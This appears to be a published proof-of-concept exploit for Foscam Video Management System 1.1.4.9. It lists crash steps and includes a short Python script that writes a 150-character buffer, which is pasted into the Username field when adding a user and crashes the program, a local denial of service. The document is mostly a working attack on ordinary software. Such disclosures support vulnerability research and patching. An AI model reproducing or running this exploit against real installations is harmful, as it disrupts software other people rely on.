# Exploit Title: Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2019-01-04
# Vendor Homepage: https://www.foscam.es/
# Software Link : https://www.foscam.es/descarga/FoscamVMS_1.1.4.9.zip
# Tested Version: 1.1.4.9
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es

# Steps to Produce the Crash: 
# 1.- Run python code : python FoscamVMS_1.1.4.9.py
# 2.- Open FoscamVMS_1.1.4.9.txt and copy content to clipboard
# 3.- Open FoscamVMS
# 4.- User Name -> admin
# 5.- Password ->
# 6.- Login
# 7.- System Settings
# 8.- User Management Settings
# 9.- Add
# 10.- Paste ClipBoard on "Username"
# 11.- Password -> P4ssw0rd
# 12.- Save
# 13.- Crashed

#!/usr/bin/env python
 
buffer = "\x41" * 150
f = open ("FoscamVMS_1.1.4.9.txt", "w")
f.write(buffer)
f.close()